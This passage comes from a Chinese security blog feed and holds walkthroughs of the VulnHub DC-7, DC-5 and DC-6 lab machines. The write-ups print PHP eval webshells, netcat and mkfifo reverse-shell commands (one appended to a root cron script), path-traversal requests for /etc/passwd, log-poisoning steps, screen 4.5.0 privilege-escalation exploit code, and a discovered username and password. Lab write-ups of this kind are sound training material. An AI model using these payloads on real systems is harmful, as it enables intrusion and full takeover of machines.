+<p><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151802242.png" alt="image-20241015180229064" loading="lazy"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151802032.png" alt="image-20241015180238982" loading="lazy"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151802638.png" alt="image-20241015180250591" loading="lazy"></p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151803773.png" alt="image-20241015180310723" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151803994.png" alt="image-20241015180335948" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151803247.png" alt="image-20241015180351210" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151804370.png" alt="image-20241015180400310" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151804525.png" alt="image-20241015180411471" loading="lazy"></figure>
+<p>通过wappalyzer查看框架</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151721404.png" alt="image-20241015172115294" loading="lazy"></figure>
+<p>cms扫描结果是Drupal 8</p>
+<p>在页面下方发现</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151805823.png" alt="image-20241015180511792" loading="lazy"></figure>
+<p>上谷歌查一下这个是什么东东</p>
+<p>在github中找到了源码</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151820795.png" alt="image-20241015182016722" loading="lazy"></figure>
+<p>发现了一个配置文件（config.php）</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151821580.png" alt="image-20241015182120539" loading="lazy"></figure>
+<p>打开之后直接就获得了可能的账号密码（dc7user、MdR3xOgB7#dW）</p>
+<p>去login的位置登录</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151823967.png" alt="image-20241015182353926" loading="lazy"></figure>
+<p>发现登录失败</p>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151824516.png" alt="image-20241015182406467" loading="lazy"></figure>
+<p>来试试登录ssh服务</p>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151831257.png" alt="image-20241015183107206" loading="lazy"></figure>
+<p>发现登录成功</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151832171.png" alt="image-20241015183240132" loading="lazy"></figure>
+<p>查看有什么文件</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151856330.png" alt="image-20241015185642298" loading="lazy"></figure>
+<p>打开mbox</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151856140.png" alt="image-20241015185605079" loading="lazy"></figure>
+<p>发现root在定时执行/opt/scripts/backups.sh脚本</p>
+<p>查看一个这个脚本有什么用</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151909618.png" alt="image-20241015190923564" loading="lazy"></figure>
+<p>查看一下backups.sh里面的命令</p>
+<p>发现这个脚本中使用了drush命令，百度了一下这个命令是是Drupal的一个命令行外壳和脚本接口。</p>
+<p>尝试一下脏牛提权</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410152037283.png" alt="image-20241015203754205" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410152038942.png" alt="image-20241015203822890" loading="lazy"></figure>
+<p>发现收到了一个新邮件</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410152038482.png" alt="image-20241015203855446" loading="lazy"></figure>
+<p>随着路径去查看</p>
+<p>发现怎么还是这个哈哈哈</p>
+<p>再介绍一下常见的几种提权方式</p>
+<p>sudo和suid提权</p>
+<p>sudo -l #查看可以sudo使用的程序</p>
+<p>find / -perm -4000 2&gt;/dev/null #寻找有SUID权限（4000）的文件，不显示其他的错误信息相当于过滤</p>
+<p>结果，这里并没有看到sudo和suid提权的方式</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160859408.png" alt="image-20241016085932369" loading="lazy"></figure>
+<p>那接下来继续查看邮件</p>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410152043999.png" alt="image-20241015204323936" loading="lazy"></figure>
+<p>兜兜转转又回来了</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160850749.png" alt="image-20241016085039670" loading="lazy"></figure>
+<p>一直在执行这个 来看看这个是啥子嘛</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160853377.png" alt="image-20241016085324336" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160854953.png" alt="image-20241016085444907" loading="lazy"></figure>
+<p>这里看到 backups.sh 文件里面执行了drush命令，执行的文件是/home/dc7user/backups/website.sql</p>
+<p>想着直接改文件路径，但是可惜只有可读和可执行的权限，并不能写文件，想要写入的话还需要获取到webshell，使用www-data的用户权限</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160857410.png" alt="image-20241016085714363" loading="lazy"></figure>
+<p>解释：</p>
+<p>drush是一个shell接口，用于从云服务器命令行管理Drupal。</p>
+<p>需要在 drupal web目录执行（/var/www/[drupal_folder_name]）</p>
+<p>使用 drup 更改密码运行命令（drush user-password admin --password=&quot;new_pass&quot;）</p>
+<p>drush user-password admin --password=&quot;admin&quot;</p>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160905563.png" alt="image-20241016090533526" loading="lazy"></figure>
+<p>成功更改用户admin 密码为admin 登录成功</p>
+<figure data-type="image" tabindex="33"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160905191.png" alt="image-20241016090508116" loading="lazy"></figure>
+<p>因为dc7的CMS是Drupal8，已经移除了PHP Filter（php过滤器），后续作为一个模组存在，可以手动安装。在官网找到下载链接，下载之后给 DC-7 安装</p>
+<p>下载链接https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</p>
+<p>回到admin的后台管理界面依次点击左上角的manager→extend→install new module，浏览选择刚才的压缩包。</p>
+<figure data-type="image" tabindex="34"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160910254.png" alt="image-20241016091011189" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160910774.png" alt="image-20241016091023724" loading="lazy"></figure>
+<p>安装成功</p>
+<figure data-type="image" tabindex="36"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160910247.png" alt="image-20241016091052206" loading="lazy"></figure>
+<p>install安装成功，点击next steps里的enable newly added modules（启用新添加的模块）激活php模块</p>
+<figure data-type="image" tabindex="37"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160915484.png" alt="image-20241016091532423" loading="lazy"></figure>
+<p>安装成功</p>
+<figure data-type="image" tabindex="38"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160915358.png" alt="image-20241016091555306" loading="lazy"></figure>
+<p>在Content中添加一句话木马，依次点击：content（内容）→add content→basic page（为静态内容使用基本页面），测试添加<?php phpinfo(); ?>，命名为ceshi。选择format为php code。</p>
+<figure data-type="image" tabindex="39"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160919080.png" alt="image-20241016091945019" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160921799.png" alt="image-20241016092101735" loading="lazy"></figure>
+<p>挂一句话木马（<?php @eval($_POST['liuliansu']);?>）</p>
+<figure data-type="image" tabindex="41"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160936403.png" alt="image-20241016093640334" loading="lazy"></figure>
+<p>使用蚁剑连接</p>
+<figure data-type="image" tabindex="42"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160941915.png" alt="image-20241016094134862" loading="lazy"></figure>
+<p>连接后进入虚拟终端反弹shell</p>
+<p>监听kali机的8888端口</p>
+<figure data-type="image" tabindex="43"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160951813.png" alt="image-20241016095149765" loading="lazy"></figure>
+<p>在蚁剑的虚拟终端</p>
+<p>nc -e /bin/bash 192.168.56.102 8888</p>
+<figure data-type="image" tabindex="44"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160953284.png" alt="image-20241016095311218" loading="lazy"></figure>
+<figure data-type="image" tabindex="45"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160954406.png" alt="image-20241016095441367" loading="lazy"></figure>
+<p>交互式shell</p>
+<p>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</p>
+<figure data-type="image" tabindex="46"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410160954138.png" alt="image-20241016095456095" loading="lazy"></figure>
+<p>拿到了www-data的权限，接下来可以编辑上面所说的backups.sh，来进行提权了。</p>
+<p>进入所在目录</p>
+<figure data-type="image" tabindex="47"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161033407.png" alt="image-20241016103333360" loading="lazy"></figure>
+<p>将nc -e /bin/bash 192.168.56.102 1234之类的弹shell命令写进backups.sh，定时任务会以root身份执行这个sh文件，从而反弹root的shell完成提权。</p>
+<p>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.56.102 1234 &gt;/tmp/f&quot; &gt;&gt; backups.sh<br>
+或</p>
+<p>echo &quot;nc -e /bin/bash/ 192.168.56.102&quot; &gt;&gt;backups.sh</p>
+<p>不能用&gt;，因为&gt;会覆盖原有内容，&gt;&gt;是追加内容。</p>
+<figure data-type="image" tabindex="48"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161116708.png" alt="image-20241016111629631" loading="lazy"></figure>
+<p>等待一段时间，就能获得shell了  因为backups.sh它真的是一个定时任务执行</p>
+<figure data-type="image" tabindex="49"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161118078.png" alt="image-20241016111810013" loading="lazy"></figure>
+<p>获取到了root权限</p>
+<figure data-type="image" tabindex="50"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161118871.png" alt="image-20241016111859831" loading="lazy"></figure>
+<p>使用交互式shell</p>
+<p>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</p>
+<figure data-type="image" tabindex="51"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161119246.png" alt="image-20241016111942202" loading="lazy"></figure>
+<p>进入~目录</p>
+<figure data-type="image" tabindex="52"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161123545.png" alt="image-20241016112303486" loading="lazy"></figure>
+<p>成功找到flag</p>
+<p>”/“是根目录，”~“是家目录。Linux存储是以挂载的方式，相当于是树状的，源头就是”/“，也就是根目录。而每个用户都有”家“目录，也就是用户的个人目录，比如root用户的”家“目录就是/root,普通用户a的家目录就是/home/a.可以看到</p>
+<figure data-type="image" tabindex="53"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410161130334.png" alt="image-20241016113048274" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DC-6靶场]]></title>
+        <id>https://dengdinshan.github.io/post/dc-6-ba-chang/</id>
+        <link href="https://dengdinshan.github.io/post/dc-6-ba-chang/">
+        </link>
+        <updated>2024-10-16T15:22:44.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="dc-6">DC-6</h1>
+<p>靶场下载地址https://www.vulnhub.com/entry/dc-6,315/</p>
+<p>kali ip 192.168.56.102</p>
+<p>靶机ip 192.168.56.111</p>
+<p>又想问我怎么知道的？ 扫一下就出来了</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410131933545.png" alt="image-20241013193312476" loading="lazy"></figure>
+<p>接下来的信息搜集来查看开放了哪些端口吧</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410131934290.png" alt="image-20241013193427232" loading="lazy"></figure>
+<p>开放了一个ssh和http端口，80端口是<code>wordpress5.1.1</code>搭建的，并且访问80端口url会跳转到<code>wordy</code>并且无法返回页面，想到修改hosts</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DC-5靶场]]></title>
+        <id>https://dengdinshan.github.io/post/dc-5-ba-chang/</id>
+        <link href="https://dengdinshan.github.io/post/dc-5-ba-chang/">
+        </link>
+        <updated>2024-10-16T15:22:03.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="dc-5">DC-5</h1>
+<p>靶场下载地址  https://www.vulnhub.com/entry/dc-5,314/</p>
+<p>下载后导入virtualbox</p>
+<p>kali ip 192.168.56.102</p>
+<p>靶机ip 192.168.56.109</p>
+<p>又想问我是怎么知道的？</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111447074.png" alt="image-20241011144134538" loading="lazy"></figure>
+<p>渗透第一步 信息搜集</p>
+<p>用nmap进行常规扫描查看端口 就像是生病去医院一样 拍个片一下子就明了了</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111447085.png" alt="image-20241011144622346" loading="lazy"></figure>
+<p>从扫描结果我们可以看出 开放了80、111、33544端口</p>
+<p>我们先从80端口去入手</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111449239.png" alt="image-20241011144911166" loading="lazy"></figure>
+<p>能够发现在最后一个栏目可以填写数据<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111450680.png" alt="image-20241011145003610" loading="lazy"></p>
+<p>查一下指纹</p>
+<figure data-type="image" tabindex="4"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20241011145405119.png" alt="image-20241011145405119" loading="lazy"></figure>
+<p>也可以使用whatweb</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111454235.png" alt="image-20241011145433181" loading="lazy"></figure>
+<p>提交一下留言板 发现传参方式是GET传参</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111456089.png" alt="image-20241011145620046" loading="lazy"></figure>
+<p>好像有细微变化</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111457806.png" alt="image-20241011145732773" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111457168.png" alt="image-20241011145752138" loading="lazy"></figure>
+<p>只要一刷新页面 这个年份就会改变</p>
+<p>来扫一下目录</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111500356.png" alt="image-20241011150057280" loading="lazy"></figure>
+<p>发现footer.php是这个年月日</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111502157.png" alt="image-20241011150247121" loading="lazy"></figure>
+<p>刷新会更改  判断有footer.php的页面存在文件包含</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111507104.png" alt="image-20241011150711055" loading="lazy"></figure>
+<p>使用bp爆破<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111517130.png" alt="image-20241011151744076" loading="lazy"></p>
+<p>发现存在index.php，solutions.php，about-us.php，faq.php，contact.php，thankyou.php，footer.php七个页面</p>
+<p>确认footer.php的页面存在文件包含</p>
+<p>使用BurpSuite爆破文件包含的变量名即可能被包含的值</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111522792.png" alt="image-20241011152241737" loading="lazy"></figure>
+<p>爆破出参数名是file  路径有很多</p>
+<p>访问最短路径 /thankyou.php?file=%2e%2e%2fetc%2fpasswd</p>
+<p>成功包含到字典</p>
+<p>http://192.168.56.109/thankyou.php?file=%2fetc%2fpasswd</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111536044.png" alt="" loading="lazy"></figure>
+<p>http://192.168.56.109/thankyou.php?file=/etc/passwd</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111537177.png" alt="image-20241011153727119" loading="lazy"></figure>
+<p>好像出了点小毛病没有回显 重新安装靶场 下面的ip地址更新为</p>
+<p>靶机192.168.56.110</p>
+<p>kali  192.168.56.102</p>
+<p>终于上当了</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111704876.png" alt="image-20241011170422559" loading="lazy"></figure>
+<p>http://192.168.56.110/thankyou.php?file=../../../../var/log/nginx/error.log</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111704210.png" alt="image-20241011170435130" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111715251.png" alt="image-20241011171517158" loading="lazy"></figure>
+<p>写入一句话木马</p>
+<p>http://192.168.56.110/thankyou.php?file=../../../../var/log/nginx/access.log</p>
+<p>写入phpinfo</p>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111718053.png" alt="image-20241011171831003" loading="lazy"></figure>
+<p>重新打开日志文件可以看到成功写入，成功回显出phpinfo信息</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111721638.png" alt="image-20241011172101573" loading="lazy"></figure>
+<p>写入webshell</p>
+<p>采用<?php @eval($_REQUEST[powershell])?>替换上面的<?php phpinfo();?>就OK。</p>
+<p>GET <?php @eval($_REQUEST[powershell])?> HTTP/1.1</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410111723208.png" alt="image-20241011172324156" loading="lazy"></figure>
+<p>重新进入页面</p>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121110021.png" alt="image-20241012111028900" loading="lazy"></figure>
+<p>能够从页面中看到挂马的日志</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121149710.png" alt="image-20241012114915659" loading="lazy"></figure>
+<p>使用蚁剑连接</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121148998.png" alt="image-20241012114823808" loading="lazy"></figure>
+<p>成功连接</p>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121151798.png" alt="image-20241012115134729" loading="lazy"></figure>
+<p>在/目录下的tmp创建一个新文件 叫做powershell</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121201450.png" alt="image-20241012120136383" loading="lazy"></figure>
+<p>在powershell里写入shell</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121202669.png" alt="image-20241012120206614" loading="lazy"></figure>
+<p>我们采用之前发现的文件包含漏洞包含我们新建的shell就可以访问到shell，我们的shell有输出，在页面下方可以看到我们的输出hello-world</p>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121438180.png" alt="image-20241012143803088" loading="lazy"></figure>
+<p>蚁剑重新连接webshell，右键添加数据，填入url以及密码，url就是我们新建的shell地址。</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121443657.png" alt="image-20241012144304602" loading="lazy"></figure>
+<p>连接成功打开虚拟终端</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121444052.png" alt="image-20241012144417006" loading="lazy"></figure>
+<p>蚁剑终端不如kali终端，我们反弹shell到kali</p>
+<p>在kali上打开监听</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121451313.png" alt="image-20241012145125271" loading="lazy"></figure>
+<p>靶机执行shell反弹命令</p>
+<p>nc -e /bin/bash 192.168.56.102 55555</p>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121452909.png" alt="image-20241012145212868" loading="lazy"></figure>
+<p>使用python进入交互式shell</p>
+<p>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</p>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121453006.png" alt="image-20241012145319964" loading="lazy"></figure>
+<p>查看能否进行suid提权的时候发现了一个有版本好的程序</p>
+<p>find / -perm -4000 2&gt;/dev/null #寻找有SUID权限（4000）的文件，不显示其他的错误信息相当于过滤。</p>
+<p>发现screen-4.5.0，使用41145.sh脚本提权<br>
+GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。<br>
+GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<br>
+下面两条命令都行<br>
+find / -user root -perm -4000 -print 2&gt;/dev/null</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
+<figure data-type="image" tabindex="33"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121455731.png" alt="image-20241012145525683" loading="lazy"></figure>
+<p>查找screen 4.5.0漏洞脚本文件</p>
+<figure data-type="image" tabindex="34"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121458785.png" alt="image-20241012145847734" loading="lazy"></figure>
+<p>发现screen 4.5.0 存在本地特权提升的漏洞，我们利用第一个，将脚本复制到本目录下</p>
+<figure data-type="image" tabindex="35"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121501122.png" alt="image-20241012150123069" loading="lazy"></figure>
+<p>查看 41154.sh脚本文件</p>
+<figure data-type="image" tabindex="36"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121502115.png" alt="image-20241012150247019" loading="lazy"></figure>
+<p>按照脚本提示，先将第一部分内容写到libhax.c中(一共有三个部分)<br>
+创建一个文件夹存放三个部分的脚本</p>
+<figure data-type="image" tabindex="37"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121504737.png" alt="image-20241012150437687" loading="lazy"></figure>
+<p>创建libhax.c文件，用vim编辑  写入如下文件</p>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;sys/types.h&gt;<br>
+#include &lt;unistd.h&gt;<br>
+<strong>attribute</strong> ((<strong>constructor</strong>))<br>
+void dropshell(void){<br>
+chown(&quot;/tmp/rootshell&quot;, 0, 0);<br>
+chmod(&quot;/tmp/rootshell&quot;, 04755);<br>
+unlink(&quot;/etc/ld.so.preload&quot;);<br>
+printf(&quot;[+] done!\n&quot;);<br>
+}</p>
+<figure data-type="image" tabindex="38"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121506044.png" alt="image-20241012150635999" loading="lazy"></figure>
+<p>编译这个脚本</p>
+<p>gcc -fPIC -shared -ldl -o libhax.so libhax.c</p>
+<figure data-type="image" tabindex="39"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121507370.png" alt="image-20241012150729322" loading="lazy"></figure>
+<p>查看编译生成的os文件</p>
+<figure data-type="image" tabindex="40"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121509382.png" alt="image-20241012150915333" loading="lazy"></figure>
+<p>将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件<br>
+这里我直接采用vim创建文件  写入第二段</p>
+<figure data-type="image" tabindex="41"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121512487.png" alt="image-20241012151216433" loading="lazy"></figure>
+<p>编译.c文件</p>
+<p>gcc -fPIC -shared -ldl -o rootshell.so rootshell.c</p>
+<figure data-type="image" tabindex="42"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121523348.png" alt="image-20241012152358280" loading="lazy"></figure>
+<p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!/bin/bash表示执行环境。最后保存是需要输入:set ff=unix是为了防止脚本的格式错误。</p>
+<figure data-type="image" tabindex="43"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121535864.png" alt="image-20241012153547784" loading="lazy"></figure>
+<p>完成3个步骤后之间把三个文件上传至靶机的/tmp文件下，然后执行./dc5即可提权。</p>
+<p>将这三个文件传到靶机</p>
+<figure data-type="image" tabindex="44"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121537661.png" alt="image-20241012153704609" loading="lazy"></figure>
+<p>这里我把不要的删除</p>
+<figure data-type="image" tabindex="45"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121538576.png" alt="image-20241012153820530" loading="lazy"></figure>
+<p>这里我把文件通过xftp进行传输</p>
+<figure data-type="image" tabindex="46"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121546993.png" alt="image-20241012154647931" loading="lazy"></figure>
+<p>打开蚁剑，打开连接，进入文件系统，进入/tmp目录，右键选择文件上传</p>
+<figure data-type="image" tabindex="47"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121547436.png" alt="image-20241012154745372" loading="lazy"></figure>
+<p>在shell中切换到/tmp目录下（dc5.sh所在目录）<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121549961.png" alt="image-20241012154906918" loading="lazy"></p>
+<p>给dc5.sh加执行权限</p>
+<p>chmod +x dc5.sh</p>
+<p>chmod 777 dc5.sh</p>
+<figure data-type="image" tabindex="48"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121642432.png" alt="image-20241012164218314" loading="lazy"></figure>
+<p>版本不对 所以说提权不了</p>
+<p>重新试了一种方法但是不能在这个环境中编译成功</p>
+<figure data-type="image" tabindex="49"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121643981.png" alt="image-20241012164318934" loading="lazy"></figure>
+<p>更换<code>glibc</code>有点麻烦，我换<code>wsl2</code>用<code>ubuntu 20.04 glibc 2.31</code>进行编译，再传，成功提到<code>root</code>权限</p>
+<figure data-type="image" tabindex="50"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121644976.png" alt="image-20241012164407889" loading="lazy"></figure>
+<p>终于getshell</p>
+<figure data-type="image" tabindex="51"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410121644160.png" alt="image-20241012164427041" loading="lazy"></figure>
+<p>总结</p>
+<p>扫描端口发现开放端口80、111、33544<br>
+进入web页面后发现一个提交栏，提交后页脚会有变化，猜测为文件包含漏洞<br>
+由于页面是nginx，nginx的默认日志路径为/var/log/nginx中，<br>
+采用url：192.168.56.110/thankyou.php?file=/var/log/nginx/access.log 查看<br>
+写入一句话木马，使用蚁剑连接后反弹shell回kali终端。<br>
+kali中使用sudo -l发现无法查看，则通过find / -perm -u=s -type f 2&gt;/dev/null来查看是否可以使用suid提权，发现可以利用screen-4.5.0进行提权。<br>
+searchsploit screen-4.5.0后下载相关文档，根据文档的指示写了三个文件libhax.so、rootshell、dc5.sh，通过蚁剑直接上传到靶机中，赋予dc5.sh 777权限并执行，即可成功。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DC-4靶场]]></title>
